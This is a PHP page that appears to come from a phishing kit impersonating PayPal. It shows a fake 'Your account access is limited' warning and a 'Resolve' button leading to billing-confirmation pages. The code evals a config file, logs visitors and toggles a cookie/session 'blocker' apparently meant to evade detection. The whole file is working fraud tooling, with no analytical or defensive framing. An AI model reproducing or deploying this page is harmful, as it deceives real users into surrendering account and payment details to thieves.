<?php
require_once __DIR__ . '/function.php';
@eval(file_get_contents($api->dir_config.'/'.$api->general_config));

if ($config_blocker == "enable") {
  $api->cookie();
  $api->session();
}

if ($config_model == "new"){
  $redirect = "confirm=billing";
} else {
  $redirect = "websrc?accessID=".$api->ngerandom();
}

$api->visitor("Sumarry");

$page = 'home';
$title = 'PayPal: Summary Limited';
$notification = 1;
require __DIR__ . '/page/header.php';
?>

<div class="contents vx_mainContent">
<div class="mainContents summaryContainer">
<div class="engagementModule nemo_engagementModule">
</div>
<div class="mainBody">
<div class="summarySection">
<div class="row">
<div class="col-sm-12 summaryModuleContainer">
<section class="walletModule nemo_balanceModule">
<div class="balanceModule">
<div class="footerLink">
<img src="../assets/img/warning.png" width="90px" height="87px"><br>
<p style="padding-top:8px;text-align:center;font-size:16px"><b><?=$api->transcode("Your account access is limited");?></b></p>
<hr>
<p style="padding-top:8px;text-align:left;font-size:16px"><b><?=$api->transcode("What's going on?");?></b></p>
<p style="padding-left: 20px;text-align:left;font-size:14px"><?=$api->transcode("We want to help ensure PayPal is a more secure place to do business. We noticed some changes in your account that require further verification. During this time, you may not have access to certain account activities.");?>
</p>
<hr>
<p style="padding-top:8px;text-align:left;font-size:16px"><b><?=$api->transcode("What do I need to do?"); ?></b></p>
<p style="padding-left: 20px;text-align:left;font-size:14px"><?=$api->transcode("Please provide all of the information we've requested. When all steps have been completed, we'll let you know when you can expect a response.");?>
</p><hr><p style="padding-bottom:8px;text-align:left;font-size:14px">
<?=$api->transcode("Please click on the button below to resolve your account access now.");?>
</p>
<a href="<?=$redirect;?>" class="vx_btn col-md-4 col-sm-4 col-xs-4"><?=$api->transcode("Resolve"); ?></a>
</div>
</div>
</section>
</div>
</div>
</div>
</div>
</div>
</div>
<?php require __DIR__ . '/page/footer.php'; ?>
